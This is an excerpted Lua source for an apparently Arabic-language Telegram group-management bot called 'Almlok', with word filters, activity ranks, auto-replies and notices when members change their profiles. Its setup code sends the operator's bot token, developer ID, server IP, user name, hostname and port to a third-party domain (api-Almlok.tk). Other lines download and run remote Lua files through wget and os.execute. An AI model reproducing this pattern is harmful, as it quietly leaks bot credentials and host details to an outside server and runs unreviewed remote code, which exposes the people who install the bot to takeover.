...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua Almlok.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
local SUDOID = io.read():gsub(' ','') 
if tostring(SUDOID):match('%d+') then
data,res = https.request("https://api-Almlok.tk/api-s00f4/Almlok.php?bn=Almlok&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-Almlok.tk/api-s00f4/Almlok.php?n=Almlok&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua Almlok.lua')
end 
end
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-Almlok/Files_Almlok/main/File_Bot/commands.lua") 
...
local Almlok_Msg = ''  
if msgs < 100 then 
Almlok_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Almlok_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Almlok_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Almlok_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Almlok_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Almlok_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Almlok_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Almlok_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Almlok_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Almlok_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Almlok_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Almlok_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Almlok_Msg = 'رب التفاعل'  
end 
return Almlok_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ALMLOK.")  
...
--------------------------------------------------------------------------------------------------------------
function SourceAlmlok(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,Almlok_Msg) 
return false  
end 
if text then    
...
os.execute('wget https://raw.githubusercontent.com/SRC-Almlok/Almlok/main/Almlok.lua')
...
send(msg.chat_id_, msg.id_,'℘︙  عدد الكروبات الان » { '..#group..' }'..Almlokk..''..Almlok..'\n℘︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
local Almlok1_Msg = database:get(bot_id.."Almlok1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Almlok1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if Almlok_Msg and not Special(msg) then  
local Almlok_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Almlok_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..Almlok_Msg.."] \n")
else
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](https://t.me/QIQAQB)}\n ℘︙ ["..Almlok_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](https://t.me/QIQAQB)}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."Almlok:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Almlok:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."Almlok:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."Almlok:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Almlok:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Almlok:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Almlok:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Almlok:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."Almlok:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Almlok:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."Almlok:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."Almlok:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Almlok:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "SrcDrg")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Almlok:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local AlmlokChengName = database:get(bot_id.."Almlok:Cheng:Name"..data.id_)
if not data.first_name_ then 
if AlmlokChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..AlmlokChengName..']')
database:del(bot_id.."Almlok:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if AlmlokChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Almlok:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local AlmlokChengUserName = database:get(bot_id.."Almlok:Cheng:UserName"..data.id_)
if not data.username_ then 
if AlmlokChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..AlmlokChengUserName..']')
database:del(bot_id.."Almlok:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if AlmlokChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Almlok:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local AlmlokChengPhoto = database:get(bot_id.."Almlok:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if AlmlokChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Almlok:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if AlmlokChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Almlok:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
℘ ⦑ SOURCE Almlok ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](https://t.me/QIQAQB)
℘︙ [Source Update ](t.me/FIDRG)     
℘︙ [Source developer](t.me/s00f4)     
℘︙ [Almlok programmer](t.me/mndzr) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS Almlok](t.me/S0DRGbot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-Almlok/Files_Almlok/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات دراكون\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس دراكون ↓\n".." ℘︙ [اضغط هنا لدخول](https://t.me/QIQAQB) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-Almlok/Files_Almlok/main/File_Bot/"..file)
if res == 200 then
...
local UserName = (b.username_ or "SRC-Almlok")
...
' }\n'..' ℘︙  الايدي بالصوره » { '..idph..
' }\n'..' ℘︙  الرفع » { '..setadd..
' }\n'..' ℘︙  الحظر » { '..banm..' }\n\nٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ قناة سورس دراكون ↓\n [🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ALMLOK.](https://t.me/QIQAQB) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
database:set(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ℘︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Almlok1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Almlok1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ℘︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Almlok1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Almlok1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Almlok1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ℘︙ ارسل الكلمه الان")  
database:set(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Almlok1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Almlok1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Almlok1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Almlok1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Almlok1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Almlok1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ℘︙ قائمة المنع \nٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do  
local Almlok_Msg = database:get(bot_id.."Almlok1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Almlok_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..Almlok_Msg[math.random(#Almlok_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ℘︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:Almlok:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:Almlok:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Almlok:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:Almlok:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:Almlok:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:Almlok:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:Almlok:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:Almlok:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:Almlok:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:Almlok:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:Almlok:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:Almlok:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:Almlok:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ALMLOK.',url="https://t.me/QIQAQB"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:Almlok:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:Almlok:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Almlok:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Almlok:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Almlok:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Almlok:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:Almlok:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Almlok:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:Almlok:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:Almlok:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:Almlok:Add:Rd:Sudo:Text2"..text)   
...
-- vardump(data) 
Almlokdx(msg.chat_id_, msg.id_, ' ℘︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ℘︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ℘︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ℘︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = 'Almlok', url="https://t.me/QIQAQB"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ Mk𝐠 ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ALMLOK. ](https://t.me/QIQAQB)➤ ')
end
...
Almlok = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Almlok)
...
--------------------------------------------------------------------------------------------------------------
SourceAlmlok(data.message_,data)
plugin_Almlok(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local AlmlokAbot = database:get(bot_id.."Almlok1:Add:Filter:Rp2"..text..result.chat_id_)   
if AlmlokAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..AlmlokAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Almlok1_Msg = database:get(bot_id.."Almlok1:Add:Filter:Rp2"..text..result.chat_id_)   
if Almlok1_Msg then    
send(msg.chat_id_, msg.id_," ℘︙ "..Almlok1_Msg)
